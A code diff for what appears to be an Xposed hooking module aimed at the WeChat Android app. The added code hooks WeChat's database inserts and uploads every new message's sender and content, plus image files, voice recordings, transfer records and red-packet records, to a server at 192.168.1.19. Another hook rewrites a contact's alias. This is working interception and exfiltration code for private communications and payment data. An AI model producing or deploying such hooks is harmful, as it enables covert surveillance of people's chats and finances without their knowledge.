@@ -2,9 +2,15 @@ package com.example.apple.wechathook;
 
 
 import android.content.ContentValues;
+import android.content.Context;
+import android.os.Build;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 
+import org.json.JSONObject;
+
 import java.lang.reflect.Field;
+import java.util.HashMap;
 import java.util.Map;
 
 import de.robv.android.xposed.IXposedHookLoadPackage;
@@ -15,38 +21,37 @@ import de.robv.android.xposed.callbacks.XC_LoadPackage;
 import android.os.Bundle;
 
 public class Main implements IXposedHookLoadPackage {
-
     @Override
     public void handleLoadPackage(final XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable {
         if(loadPackageParam.packageName.equals("com.tencent.mm"))
         {
             Log.d("CallbackMethod", "进入微信");
-			final Class<?> pmClass = XposedHelpers.findClass("com.tencent.mm.protocal.c.pm", loadPackageParam.classLoader);
-			Log.d("CallbackMethod", "pmClass:"+pmClass.toString());
-			final Class<?> sClass = XposedHelpers.findClass("com.tencent.mm.plugin.messenger.foundation.a.s", loadPackageParam.classLoader);
-			Log.d("CallbackMethod", "sClass:"+sClass.toString());
-            XposedHelpers.findAndHookMethod("com.tencent.mm.plugin.messenger.foundation.c", loadPackageParam.classLoader, "a", pmClass, byte[].class, boolean.class, sClass, new XC_MethodHook() {
-                @Override
-                protected void afterHookedMethod(XC_MethodHook.MethodHookParam param) throws Throwable {
-                    try {
-                        Log.d("CallbackMethod", "com.tencent.mm.plugin.messenger.foundation.c.a_1");
-                        Log.d("CallbackMethod", "params[0]:" + param.args[0]);
-                        Log.d("CallbackMethod", "params[1]:" + param.args[1]);
-                        Log.d("CallbackMethod", "params[2]:" + param.args[2]);
-                        Log.d("CallbackMethod", "params[3]:" + param.args[3]);
-                        int rtM = XposedHelpers.getIntField(param.args[0], "rtM");
-                        Log.d("CallbackMethod", "pmVar:" + rtM);
-                        byte[] bArr = (byte[])param.args[1];
-                        for (int i = 0; i < bArr.length; i++) {
-                            Log.d("CallbackMethod", "bArr["+i+"]:" + bArr[i]);
-                        }
-
-
-                    } catch (Throwable t) {
-                        XposedBridge.log(t);
-                    }
-                }
-            });
+//			final Class<?> pmClass = XposedHelpers.findClass("com.tencent.mm.protocal.c.pm", loadPackageParam.classLoader);
+//			Log.d("CallbackMethod", "pmClass:"+pmClass.toString());
+//			final Class<?> sClass = XposedHelpers.findClass("com.tencent.mm.plugin.messenger.foundation.a.s", loadPackageParam.classLoader);
+//			Log.d("CallbackMethod", "sClass:"+sClass.toString());
+//            XposedHelpers.findAndHookMethod("com.tencent.mm.plugin.messenger.foundation.c", loadPackageParam.classLoader, "a", pmClass, byte[].class, boolean.class, sClass, new XC_MethodHook() {
+//                @Override
+//                protected void afterHookedMethod(XC_MethodHook.MethodHookParam param) throws Throwable {
+//                    try {
+//                        Log.d("CallbackMethod", "com.tencent.mm.plugin.messenger.foundation.c.a_1");
+//                        Log.d("CallbackMethod", "params[0]:" + param.args[0]);
+//                        Log.d("CallbackMethod", "params[1]:" + param.args[1]);
+//                        Log.d("CallbackMethod", "params[2]:" + param.args[2]);
+//                        Log.d("CallbackMethod", "params[3]:" + param.args[3]);
+//                        int rtM = XposedHelpers.getIntField(param.args[0], "rtM");
+//                        Log.d("CallbackMethod", "pmVar:" + rtM);
+//                        byte[] bArr = (byte[])param.args[1];
+//                        for (int i = 0; i < bArr.length; i++) {
+//                            Log.d("CallbackMethod", "bArr["+i+"]:" + bArr[i]);
+//                        }
+//
+//
+//                    } catch (Throwable t) {
+//                        XposedBridge.log(t);
+//                    }
+//                }
+//            });
 
             XposedHelpers.findAndHookMethod("com.tencent.mm.plugin.account.ui.LoginUI", loadPackageParam.classLoader, "onCreate", Bundle.class, new XC_MethodHook() {
                 @Override
@@ -210,27 +215,27 @@ public class Main implements IXposedHookLoadPackage {
 //            });
 
 
-            XposedHelpers.findAndHookMethod("com.tencent.mm.modelcdntran.d", loadPackageParam.classLoader, "a", String.class, long.class, String.class, String.class, new XC_MethodHook() {
-                @Override
-                protected void afterHookedMethod(XC_MethodHook.MethodHookParam param) throws Throwable {
-                    try {
-                        Log.d("CallbackMethod", "com.tencent.mm.modelcdntran.d.a");
-                        Log.d("CallbackMethod", "params[0]:" + param.args[0]);
-                        Log.d("CallbackMethod", "params[1]:" + param.args[1]);
-                        Log.d("CallbackMethod", "params[2]:" + param.args[2]);
-                        Log.d("CallbackMethod", "params[3]:" + param.args[3]);
-                        Log.d("CallbackMethod", "result:"+param.getResult());
-
-                    } catch (Throwable t) {
-                        XposedBridge.log(t);
-                    }
-                }
-            });
-
-            final Class<?> networkEClass = XposedHelpers.findClass("com.tencent.mm.network.e", loadPackageParam.classLoader);
-            final Class<?> qClass = XposedHelpers.findClass("com.tencent.mm.network.q", loadPackageParam.classLoader);
-            final Class<?> eClass = XposedHelpers.findClass("com.tencent.mm.ab.e", loadPackageParam.classLoader);
-            final Class<?> kClass = XposedHelpers.findClass("com.tencent.mm.ak.k", loadPackageParam.classLoader);
+//            XposedHelpers.findAndHookMethod("com.tencent.mm.modelcdntran.d", loadPackageParam.classLoader, "a", String.class, long.class, String.class, String.class, new XC_MethodHook() {
+//                @Override
+//                protected void afterHookedMethod(XC_MethodHook.MethodHookParam param) throws Throwable {
+//                    try {
+//                        Log.d("CallbackMethod", "com.tencent.mm.modelcdntran.d.a");
+//                        Log.d("CallbackMethod", "params[0]:" + param.args[0]);
+//                        Log.d("CallbackMethod", "params[1]:" + param.args[1]);
+//                        Log.d("CallbackMethod", "params[2]:" + param.args[2]);
+//                        Log.d("CallbackMethod", "params[3]:" + param.args[3]);
+//                        Log.d("CallbackMethod", "result:"+param.getResult());
+//
+//                    } catch (Throwable t) {
+//                        XposedBridge.log(t);
+//                    }
+//                }
+//            });
+//
+//            final Class<?> networkEClass = XposedHelpers.findClass("com.tencent.mm.network.e", loadPackageParam.classLoader);
+//            final Class<?> qClass = XposedHelpers.findClass("com.tencent.mm.network.q", loadPackageParam.classLoader);
+//            final Class<?> eClass = XposedHelpers.findClass("com.tencent.mm.ab.e", loadPackageParam.classLoader);
+//            final Class<?> kClass = XposedHelpers.findClass("com.tencent.mm.ak.k", loadPackageParam.classLoader);
 //
 //            Log.d("CallbackMethod", "networkEClass:"+networkEClass+"-----  eClass:"+eClass+"-----  kClass:"+kClass);
 //			XposedHelpers.findAndHookMethod("com.tencent.mm.ak.k", loadPackageParam.classLoader, "a", networkEClass, eClass, new XC_MethodHook() {
@@ -266,22 +271,38 @@ public class Main implements IXposedHookLoadPackage {
 //					}
 //				}
 //			});
+//
+//            XposedHelpers.findAndHookMethod("com.tencent.mm.sdk.platformtools.x", loadPackageParam.classLoader, "d", String.class, String.class, Object[].class, new XC_MethodHook() {
+//                @Override
+//                protected void afterHookedMethod(XC_MethodHook.MethodHookParam param) throws Throwable {
+//                    try {
+//                        Log.d("CallbackMethod", "com.tencent.mm.sdk.platformtools.x.d:"+param.toString());
+//                        Log.d("CallbackMethod", "params[0]:" + param.args[0]);
+//                        Log.d("CallbackMethod", "params[1]:" + param.args[1]);
+//                        Log.d("CallbackMethod", "params[2]:" + param.args[2]);
+//                        Object[] objArr = (Object[])param.args[2];
+//                        if(objArr != null)
+//                        {
+//                            for (int i = 0; i < objArr.length; i++) {
+//                                Log.d("CallbackMethod", "objArr["+i+"]:" + objArr[i]);
+//                            }
+//                        }
+//
+//                    } catch (Throwable t) {
+//                        XposedBridge.log(t);
+//                    }
+//                }
+//            });
 
-            XposedHelpers.findAndHookMethod("com.tencent.mm.sdk.platformtools.x", loadPackageParam.classLoader, "d", String.class, String.class, Object[].class, new XC_MethodHook() {
+            XposedHelpers.findAndHookMethod("com.tencent.mm.plugin.profile.ui.ContactInfoUI", loadPackageParam.classLoader, "aYS", new XC_MethodHook() {
                 @Override
                 protected void afterHookedMethod(XC_MethodHook.MethodHookParam param) throws Throwable {
                     try {
-                        Log.d("CallbackMethod", "com.tencent.mm.sdk.platformtools.x.d:"+param.toString());
-                        Log.d("CallbackMethod", "params[0]:" + param.args[0]);
-                        Log.d("CallbackMethod", "params[1]:" + param.args[1]);
-                        Log.d("CallbackMethod", "params[2]:" + param.args[2]);
-                        Object[] objArr = (Object[])param.args[2];
-                        if(objArr != null)
-                        {
-                            for (int i = 0; i < objArr.length; i++) {
-                                Log.d("CallbackMethod", "objArr["+i+"]:" + objArr[i]);
-                            }
-                        }
+                        Log.d("CallbackMethod", "profile.ui.ContactInfoUI.aYS");
+                        Object guS = XposedHelpers.getObjectField(param.thisObject, "guS");
+                        Log.d("CallbackMethod", "profile.ui.ContactInfoUI.aYS.guS:" + guS);
+                        Log.d("CallbackMethod", "profile.ui.ContactInfoUI.aYS.guS.field_alias:" + XposedHelpers.getObjectField(guS, "field_alias"));
+                        XposedHelpers.setObjectField(guS, "field_alias", "****");
 
                     } catch (Throwable t) {
                         XposedBridge.log(t);
@@ -292,20 +313,151 @@ public class Main implements IXposedHookLoadPackage {
             // hook微信插入数据的方法
             XposedHelpers.findAndHookMethod("com.tencent.wcdb.database.SQLiteDatabase", loadPackageParam.classLoader, "insertWithOnConflict", String.class, String.class, ContentValues.class, int.class, new XC_MethodHook() {
                 @Override
-                protected void afterHookedMethod(MethodHookParam param) throws Throwable { // 打印插入数据信息
-                    Log.d("CallbackMethod", "------------------------insert start---------------------" + "\n\n");
-                    Log.d("CallbackMethod", "param args1:" + param.args[0]);
-                    Log.d("CallbackMethod", "param args1:" + param.args[1]);
+                protected void afterHookedMethod(final MethodHookParam param) throws Throwable { // 打印插入数据信息
+                    Log.d("SQLiteDatabase", "------------------------insert start---------------------" + "\n\n");
+                    Log.d("SQLiteDatabase", "param args1:" + param.args[0]);
+                    Log.d("SQLiteDatabase", "param args1:" + param.args[1]);
                     ContentValues contentValues = (ContentValues) param.args[2];
-                    Log.d("CallbackMethod", "param args3 contentValues:");
+                    Log.d("SQLiteDatabase", "param args3 contentValues:");
                     for (Map.Entry<String, Object> item : contentValues.valueSet()) {
                         if (item.getValue() != null) {
-                            Log.d("CallbackMethod", item.getKey() + "---------" + item.getValue().toString());
+                            Log.d("SQLiteDatabase", item.getKey() + "---------" + item.getValue().toString());
                         } else {
-                            Log.d("CallbackMethod", item.getKey() + "---------" + "null");
+                            Log.d("SQLiteDatabase", item.getKey() + "---------" + "null");
                         }
                     }
-                    Log.d("CallbackMethod", "------------------------insert over---------------------" + "\n\n");
+                    Log.d("SQLiteDatabase", "------------------------insert over---------------------" + "\n\n");
+
+                    //截获消息
+                    switch (param.args[0].toString())
+                    {
+                        //保存消息
+                        case "message":
+                            String msgId = contentValues.getAsString("msgId");
+                            String msgType = contentValues.getAsString("type");
+                            String isSend = contentValues.getAsString("isSend");
+                            String talker = contentValues.getAsString("talker");
+                            String md5 = contentValues.getAsString("md5");
+                            String createTime = contentValues.getAsString("createTime");
+                            String content = contentValues.getAsString("content");
+
+                            Map<String,String> map=new HashMap<>();
+                            map.put("msg_id", msgId);
+                            map.put("unique_id", Utlis.getUniqueID());
+                            map.put("talker", talker);
+                            map.put("msg_type", msgType);
+                            map.put("raw", param.args[2].toString());
+                            map.put("content", content);
+                            map.put("create_time", createTime);
+                            map.put("is_send", isSend);
+                            map.put("map_json", new JSONObject(map).toString());
+                            Log.d("SQLiteDatabase", "message_save_result: OK");
+                            HttpUtlis.postJsonRequest("http://192.168.1.19:3000/api/v1/messages/save.json", new JSONObject(map).toString(), "utf-8", new OnResponseListner() {
+                                @Override
+                                public void onSucess(String response) {
+                                    Log.d("SQLiteDatabase", "message_save_result: OK");
+                                }
+
+                                @Override
+                                public void onError(String error) {
+                                    Log.d("SQLiteDatabase", "message_save_result: ERROR");
+                                }
+                            });
+                            break;
+                        //上传图片
+                        case "MediaDuplication":
+                            md5 = contentValues.getAsString("md5");
+                            String path = contentValues.getAsString("path");
+                            map=new HashMap<>();
+                            map.put("unique_id", Utlis.getUniqueID());
+                            map.put("md5", md5);
+                            HttpUtlis.postFileRequest("http://192.168.1.19:3000/api/v1/messages/upload_image", map, path, "image/jpeg", new OnResponseListner() {
+                                @Override
+                                public void onSucess(String response) {
+                                    Log.d("SQLiteDatabase", "upload_image_result: OK");
+                                }
+
+                                @Override
+                                public void onError(String error) {
+                                    Log.d("SQLiteDatabase", "upload_image_result: ERROR");
+                                }
+                            });
+                            break;
+                        //上传语音文件
+                        case "WxFileIndex2":
+                            path = "/storage/emulated/0/tencent/MicroMsg/" + contentValues.getAsString("path");
+                            if(path.contains(".amr"))
+                            {
+                                msgId = contentValues.getAsString("msgId");
+                                map=new HashMap<>();
+                                map.put("msg_id", msgId);
+                                map.put("unique_id", Utlis.getUniqueID());
+                                HttpUtlis.postFileRequest("http://192.168.1.19:3000/api/v1/messages/upload_voice", map, path, "audio/amr", new OnResponseListner() {
+                                    @Override
+                                    public void onSucess(String response) {
+                                        Log.d("SQLiteDatabase", "upload_voice_result: OK");
+                                    }
+
+                                    @Override
+                                    public void onError(String error) {
+                                        Log.d("SQLiteDatabase", "upload_voice_result: ERROR");
+                                    }
+                                });
+                            }
+                            break;
+                        //更新转账记录
+                        case "RemittanceRecord":
+                            msgId = contentValues.getAsString("locaMsgId");
+                            String state = contentValues.getAsString("receiveStatus");
+                            isSend = contentValues.getAsString("isSend");
+                            map=new HashMap<>();
+                            map.put("msg_id", msgId);
+                            map.put("unique_id", Utlis.getUniqueID());
+                            map.put("state", state);
+                            map.put("is_send", isSend);
+                            HttpUtlis.postRequest("http://192.168.1.19:3000/api/v1/messages/add_remittance_record", map, "utf-8", new OnResponseListner() {
+                                @Override
+                                public void onSucess(String response) {
+                                    Log.d("SQLiteDatabase", "add_remittance_result: OK");
+                                }
+
+                                @Override
+                                public void onError(String error) {
+                                    Log.d("SQLiteDatabase", "add_remittance_result: ERROR");
+                                }
+                            });
+                            break;
+                        //更新红包记录
+                        case "WalletLuckyMoney":
+                            new Thread(new Runnable() {
+                                @Override
+                                public void run() {
+                                    Map<String,String> map=new HashMap<>();
+                                    ContentValues contentValues = (ContentValues) param.args[2];
+                                    map.put("unique_id", Utlis.getUniqueID());
+                                    map.put("hb_status", contentValues.getAsString("hbStatus"));
+                                    map.put("hb_type", contentValues.getAsString("hbType"));
+                                    map.put("receive_status", contentValues.getAsString("receiveStatus"));
+                                    map.put("receive_time", contentValues.getAsString("receiveTime"));
+                                    map.put("receive_amount", contentValues.getAsString("receiveAmount"));
+                                    map.put("content", contentValues.getAsString("mNativeUrl"));
+
+                                    Log.d("SQLiteDatabase", "add_wallet_lucky_money_record_params: "+new JSONObject(map));
+                                    HttpUtlis.postRequest("http://192.168.1.19:3000/api/v1/messages/add_wallet_lucky_money_record", map, "utf-8", new OnResponseListner() {
+                                        @Override
+                                        public void onSucess(String response) {
+                                            Log.d("SQLiteDatabase", "add_wallet_lucky_money_record_result: OK:"+response);
+                                        }
+
+                                        @Override
+                                        public void onError(String error) {
+                                            Log.d("SQLiteDatabase", "add_wallet_lucky_money_record_result: ERROR:"+error);
+                                        }
+                                    });
+                                }
+                            }).start();
+                            break;
+                    }
                 }
             });
 
